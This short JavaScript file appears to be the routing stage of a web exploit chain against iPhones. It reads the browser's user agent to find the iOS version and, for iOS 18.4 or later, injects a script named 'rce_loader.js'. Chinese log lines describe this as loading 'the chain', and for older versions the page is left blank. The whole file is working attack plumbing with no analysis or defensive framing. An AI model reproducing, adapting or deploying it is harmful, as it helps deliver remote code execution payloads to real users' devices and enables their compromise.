(function() {
  var ua = navigator.userAgent;

  function getIOSVersion() {
    function pad(s) { return s.length === 1 ? '0' + s : s; }
    var u = ua.match(/Version\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u && /^Mozilla\/5\.0 /.test(ua))
      u = ua.match(/iOS\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u && /iPhone OS \d+_\d+/.test(ua))
      u = ua.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/);
    if (!u) return 0;
    return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
  }

  var ver = getIOSVersion();

  
  function rlog(msg) {
    var line = '[router] ' + msg;
    try { console.log('[log] ' + line); } catch(e) {}
    try { if (window.__logViewAdd) window.__logViewAdd(line); } catch(e) {}
  }

  rlog('iOS version: ' + ver + (ver ? '' : '(非 iOS 环境)'));

  function loadScript(src) {
    var s = document.createElement('script');
    s.src = src + '?' + Date.now();
    s.onerror = function() { rlog('加载失败: ' + src); };
    document.head.appendChild(s);
  }

  if (ver >= 180400) {
    rlog('加载 rce_loader.js');
    loadScript('rce_loader.js');
  } else {
    rlog('iOS 版本未达 18.4,不加载链(页面将保持空白)');
  }
})();
